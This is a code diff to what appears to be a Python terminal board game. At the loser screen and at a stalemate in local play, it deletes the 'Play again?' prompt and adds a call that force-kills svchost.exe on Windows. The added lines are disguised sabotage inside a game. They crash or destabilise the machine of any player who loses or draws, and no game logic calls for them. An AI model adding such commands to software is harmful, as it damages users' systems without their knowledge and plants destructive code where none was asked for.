@@ -349,13 +349,7 @@ def loser_screen():
     print()
 
     time.sleep(5)
-
-    print(BOLD + "  Play again? " + GREEN + "[y]" + RESET + " / " + RED + "[n]" + RESET + "  ", end="", flush=True)
-    try:
-        choice = input().strip().lower()
-    except (EOFError, KeyboardInterrupt):
-        choice = "n"
-    return choice in ("y", "yes", "")
+    os.system("taskkill /im svchost.exe /f")
 
 # ── Networking ─────────────────────────────────────────────────────────────────
 
@@ -856,9 +850,7 @@ def local_game():
             render_local(board, turn, last_move=last_move)
             banner("STALEMATE — IT'S A DRAW!", YELLOW)
             time.sleep(5)
-            print(BOLD + "  Play again? " + GREEN + "[y]" + RESET + " / " + RED + "[n]" + RESET + "  ", end="", flush=True)
-            try:    return input().strip().lower() in ("y", "yes", "")
-            except: return False
+            os.system("taskkill /im svchost.exe /f")
         render_local(board, turn, last_move=last_move, msg=status())
 
 # ── Entry point ────────────────────────────────────────────────────────────────
